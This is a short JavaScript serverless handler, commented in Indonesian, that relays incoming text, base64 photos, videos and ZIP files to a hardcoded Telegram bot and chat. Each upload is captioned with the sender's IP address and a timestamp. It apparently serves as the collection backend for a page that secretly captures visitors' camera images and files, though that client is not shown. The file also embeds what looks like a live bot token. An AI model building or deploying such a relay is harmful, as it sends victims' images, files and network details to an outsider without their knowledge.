const BOT_TOKEN = "8995760973:AAHeOTaXK5pFSn8Y5Z4tlxjgR7vbYOhgUpI";
const CHAT_ID = "6126622503";

export default async function handler(req, res) {
    // 1. GET untuk pesan teks
    if (req.method === 'GET' && req.query.msg) {
        try {
            const text = decodeURIComponent(req.query.msg);
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text })
            });
            res.status(200).send('OK');
        } catch(e) {
            res.status(500).json({ error: e.message });
        }
        return;
    }

    // 2. POST untuk foto, video, dokumen (ZIP)
    if (req.method === 'POST') {
        try {
            const { img, video, ts, filename, type } = req.body;
            const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';
            const ua = req.headers['user-agent'] || 'unknown';
            const caption = `📸 ${type || 'media'} | IP: ${ip} | ${new Date(ts).toISOString()}`;

            // Kirim dokumen (ZIP)
            if (type === 'document' && video) {
                const buf = Buffer.from(video, 'base64');
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('document', new Blob([buf], { type: 'application/zip' }), filename || 'archive.zip');
                formData.append('caption', caption);
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
                    method: 'POST',
                    body: formData
                });
                res.status(200).send('OK');
                return;
            }

            // Kirim video
            if (type === 'video' && video) {
                const buf = Buffer.from(video, 'base64');
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('video', new Blob([buf], { type: 'video/webm' }), filename || 'video.webm');
                formData.append('caption', caption);
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
                    method: 'POST',
                    body: formData
                });
                res.status(200).send('OK');
                return;
            }

            // Kirim foto
            if (img) {
                const buf = Buffer.from(img, 'base64');
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', new Blob([buf], { type: 'image/jpeg' }), filename || 'foto.jpg');
                formData.append('caption', caption);
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                res.status(200).send('OK');
                return;
            }

            res.status(400).send('Tidak ada media');
        } catch(e) {
            console.error(e);
            res.status(500).json({ error: e.message });
        }
        return;
    }

    res.status(200).send('Bot Aktif!');
}
